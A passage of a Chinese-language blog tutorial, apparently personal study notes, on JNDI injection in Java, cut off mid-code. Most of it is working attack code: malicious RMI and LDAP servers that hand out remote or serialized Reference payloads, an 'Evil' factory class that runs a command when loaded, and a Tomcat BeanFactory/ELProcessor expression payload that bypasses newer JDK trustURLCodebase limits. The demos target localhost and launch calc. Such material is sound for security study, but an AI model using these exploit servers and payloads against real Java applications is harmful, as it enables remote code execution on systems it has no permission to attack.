align="center">协议URL</th><th>Context类</th></tr></thead><tbody><tr><td>DNS协议</td><td align="center">dns:&#x2F;&#x2F;</td><td>com.sun.jndi.url.dns.dnsURLContext</td></tr><tr><td>RMI协议</td><td align="center">rmi:&#x2F;&#x2F;</td><td>com.sun.jndi.url.rmi.rmiURLContext</td></tr><tr><td>LDAP协议</td><td align="center">ldap:&#x2F;&#x2F;</td><td>com.sun.jndi.url.ldap.ldapURLContext</td></tr><tr><td>LDAP协议</td><td align="center">ldaps:&#x2F;&#x2F;</td><td>com.sun.jndi.url.ldaps.ldapsURLContextFactory</td></tr><tr><td>IIOP对象请求代理协议</td><td align="center">iiop:&#x2F;&#x2F;</td><td>com.sun.jndi.url.iiop.iiopURLContext</td></tr><tr><td>IIOP对象请求代理协议</td><td align="center">iiopname:&#x2F;&#x2F;</td><td>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</td></tr><tr><td>IIOP对象请求代理协议</td><td align="center">corbaname:&#x2F;&#x2F;</td><td>com.sun.jndi.url.corbaname.corbanameURLContextFactory</td></tr></tbody></table><p>获取到这些Context后再进行后续的lookup方法</p><h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>常用的重载方法</p><div class="code-wrapper"><pre><code class="hljs java">Reference(String className, String factory, String factoryLocation)</code></pre></div><p>各个参数含义如下</p><ul><li>className: 工厂类加载的类名</li><li>factory: 远程加载的工厂类类名</li><li>factoryLocation: 远程加载工厂类的地址 (file http ftp 等协议)</li></ul><p>客户端通过 lookup 得到 Reference 对象后, 会继续访问 factoryLocation 从而去加载某个 factory class, 然后调用该 factory 实例的 getObjectInstance 方法, 最终得到某个 class (由 className 指定)</p><p>Reference 可以被绑定在 RMI 或 LDAP 服务器上, 下文将分别讲解如何利用这两种方式来进行 JNDI 注入并远程加载恶意 class</p><h4 id="RMI-Reference"><a href="#RMI-Reference" class="headerlink" title="RMI + Reference"></a>RMI + Reference</h4><p>对于 RMI 协议, 我们可以将 Reference (或者套上一层 ReferenceWrapper) 绑定到 RMI Registry, 然后控制 lookup 参数指向恶意 RMI 服务器来加载恶意 class</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<span class="hljs-keyword">import</span> javax.naming.Context;<span class="hljs-keyword">import</span> javax.naming.InitialContext;<span class="hljs-keyword">import</span> javax.naming.NamingException;<span class="hljs-keyword">import</span> javax.naming.Reference;<span class="hljs-keyword">import</span> java.rmi.Remote;<span class="hljs-keyword">import</span> java.rmi.RemoteException;<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException &#123;        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<span class="hljs-comment">//        HelloImpl hello = new HelloImpl();</span><span class="hljs-comment">//        context.bind(&quot;hello&quot;,hello);</span>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;com.example.Evil&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span>);        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);        context.bind(<span class="hljs-string">&quot;test&quot;</span>,reference);    &#125;&#125;</code></pre></div><p>Evil不继承ObjectFactory的话控制台会报错，但可以执行</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418191713119.png" alt="image-20240418191713119"></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> javax.naming.Context;<span class="hljs-keyword">import</span> javax.naming.Name;<span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.util.Hashtable;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> javax.naming.InitialContext;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIDemo</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();        ctx.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/test&quot;</span>);    &#125;&#125;</code></pre></div><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418192319264.png" alt="image-20240418192319264"></p><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418194940573.png" alt="image-20240418194940573"></p><p>不断跟进</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418223447232.png" alt="image-20240418223447232"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418195237564.png" alt="image-20240418195237564"></p><p>本地加载 factory 类失败的话就会获取 codebase (也就是 factoryLocation), 再传入 helper 中使用 URLClassLoader 尝试加载</p><p>如果加载成功, 就会实例化 factory 类并强制转换为 ObjectFactory 类型, 这里也就是为什么我们最好要让 Evil 类继承 ObjectFactory</p><h4 id="LDAP-Reference"><a href="#LDAP-Reference" class="headerlink" title="LDAP + Reference"></a>LDAP + Reference</h4><p>LDAP 的 JNDI 注入与 RMI 基本一致</p><p>手工搭建LDAP服务器需要添加如下依赖包</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.0.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<span class="hljs-keyword">import</span> com.unboundid.util.Base64;<span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<span class="hljs-keyword">import</span> javax.net.SocketFactory;<span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<span class="hljs-keyword">import</span> java.net.InetAddress;<span class="hljs-keyword">import</span> java.net.MalformedURLException;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">import</span> java.text.ParseException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#Evil&quot;</span>;        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(                    <span class="hljs-string">&quot;listen&quot;</span>,                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);            ds.startListening();        &#125;        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;        <span class="hljs-keyword">private</span> URL codebase;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;            <span class="hljs-built_in">this</span>.codebase = cb;        &#125;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><span class="hljs-comment">         *</span><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><span class="hljs-comment">         */</span>        <span class="hljs-meta">@Override</span>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">(InMemoryInterceptedSearchResult result )</span> &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);            <span class="hljs-keyword">try</span> &#123;                sendResult(result, base, e);            &#125;            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;                e1.printStackTrace();            &#125;        &#125;        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);            &#125;<span class="hljs-comment">//             Payload1: 利用 LDAP + Reference Factory</span>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<span class="hljs-comment">//             Payload2: 返回序列化 Gadget</span><span class="hljs-comment">//            try &#123;</span><span class="hljs-comment">//                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;...&quot;));</span><span class="hljs-comment">//            &#125; catch (ParseException exception) &#123;</span><span class="hljs-comment">//                exception.printStackTrace();</span><span class="hljs-comment">//            &#125;</span>            result.sendSearchEntry(e);            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> javax.naming.InitialContext;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIDemo</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();        ctx.lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/test&quot;</span>);    &#125;&#125;</code></pre></div><h5 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h5><p>自行下断点</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418223621771.png" alt="image-20240418223621771"></p><p>LDAP 的通信过程中存在一个 <code>JAVA_ATTRIBUTES</code> 静态数组, 通过它来获取 attribute name 然后去 var0 中查询</p><p>我们服务端中手动添加</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418222242882.png" alt="image-20240418222242882"></p><p>之后会回到原来的 LdapCtx, 调用 <code>DirectoryManager.getObjectInstance()</code></p><p>最后仍是到这里</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418195237564.png" alt="image-20240418195237564"></p><h2 id="绕过jdk高版本限制"><a href="#绕过jdk高版本限制" class="headerlink" title="绕过jdk高版本限制"></a>绕过jdk高版本限制</h2><p>高版本 jdk 做出的一些限制</p><ul><li><strong>6u45 7u21 之后</strong>: <code>java.rmi.server.useCodebaseOnly</code> 默认为 true, 禁止利用 RMI ClassLoader 加载远程类 (但是 Reference 加载远程类本质上利用的是 URLClassLoader, 所以该参数对于 JNDI 注入无任何影响 )</li><li><strong>6u141, 7u131, 8u121 之后</strong>: <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 和 <code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 默认为 false, 禁止 RMI 和 CORBA 协议使用远程 codebase 来进行 JNDI 注入</li><li><strong>6u211, 7u201, 8u191 之后</strong>: <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认为 false, 禁止 LDAP 协议使用远程 codebase 来进行 JNDI 注入</li></ul><p>下面会列举一些绕过高版本 jdk 来进行 JNDI 注入的方法</p><h3 id="本地-（无用）"><a href="#本地-（无用）" class="headerlink" title="本地 （无用）"></a>本地 （无用）</h3><p>把属性设置为true</p><div class="code-wrapper"><pre><code class="hljs reasonml">InitialContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InitialContext()</span>;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>)</span>;context.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/test&quot;</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>)</span>;context.lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/test&quot;</span>);</code></pre></div><h3 id="利用本地-Class-作为-Factory"><a href="#利用本地-Class-作为-Factory" class="headerlink" title="利用本地 Class 作为 Factory"></a>利用本地 Class 作为 Factory</h3><p>原理很简单, 既然禁止通过 codebase 远程加载, 那就去加载一个能够利用的本地 factory 然后执行 java 代码</p><p>但是这种利用方式受限于目标机器本地 classpath 中是否存在对应的 factory</p><p>理论上根据依赖的不同, 会有很多种利用方式, 这里以网上讨论最多的 <code>org.apache.naming.factory.BeanFactory</code> 和 <code>javax.el.ELProcessor</code> 为例</p><p>BeanFactory 来自 tomcat 的依赖包, 所以适用范围相对来说会广一些</p><p>ELProcessor 则是 java 自带的表达式解析引擎</p><p>添加如下依赖</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>。。。大佬说的这个依赖好像有点问题，会报出错误</p><p>手动导入这些依赖能避免一些错误</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240419194245840.png" alt="image-20240419194245840"></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<span class="hljs-keyword">import</span> javax.naming.Context;<span class="hljs-keyword">import</span> javax.naming.InitialContext;<span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);        env.put(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);        ctx.bind(<span class="hljs-string">&quot;test&quot;</span>, referenceWrapper);    &#125;&#125;</code></pre></div><p>BeanFactory大概作用就是类似setter赋值的东西，根据这个forceString</p><p>然后根据&#x3D;分割为propname和value，这里<code>x=eval ，&quot;x&quot;,&quot;........&quot;</code>其实就相当于<code>eval</code>的值为<code>......</code></p><p>。。。不知道讲啥了</p><p>说一下如何找Factory，要继承ObjectFactory，并且有getObjectInstance</p><p>更具体的我也不会，就这样</p><h4 id="BeanFactory版本限制"><a href="#BeanFactory版本限制" class="headerlink" title="BeanFactory版本限制"></a>BeanFactory版本限制</h4><p>补充一下 <code>forceString</code> 这个 trick 在较新版本的 Tomcat 内已经被修复了, 参考如下 commit</p><p>Tomcat 8.5.79: <a href="https://github.com/apache/tomcat/commit/48dd609fd193dbe8dd94fd231c45d987da6c359f">https://github.com/apache/tomcat/commit/48dd609fd193dbe8dd94fd231c45d987da6c359f</a></p><p>Tomcat 9.0.63: <a href="https://github.com/apache/tomcat/commit/df7da6c29aace17c92fe47fe386ab14ece59b5d4">https://github.com/apache/tomcat/commit/df7da6c29aace17c92fe47fe386ab14ece59b5d4</a></p><h3 id="LDAP返回序列化数据"><a href="#LDAP返回序列化数据" class="headerlink" title="LDAP返回序列化数据"></a>LDAP返回序列化数据</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>也很简单，和上面的前半段一样，要有javaClassName进入decodeObject</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214712148.png" alt="image-20240425214712148"></p><p>然后转换方向，进入deserializeObject，需要javaSerializedData即可</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214758541.png" alt="image-20240425214758541"></p><p>然后存在反序列化</p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214913135.png" alt="image-20240425214913135"></p><p>即javaSerializedData的值为恶意序列化数据</p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<span class="hljs-keyword">import</span> javax.net.SocketFactory;<span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<span class="hljs-keyword">import</span> java.net.InetAddress;<span class="hljs-keyword">import</span> java.net.MalformedURLException;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">import</span> java.net.UnknownHostException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#Evil&quot;</span>;        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;        <span class="hljs-keyword">try</span>&#123;            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(                    <span class="hljs-string">&quot;listen&quot;</span>,                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()            ));            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span>+port);            ds.startListening();        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span>&#123;        <span class="hljs-keyword">private</span> URL codebase;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span><span class="hljs-params">(URL cb)</span>&#123;            <span class="hljs-built_in">this</span>.codebase = cb;        &#125;        <span class="hljs-meta">@Override</span>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span 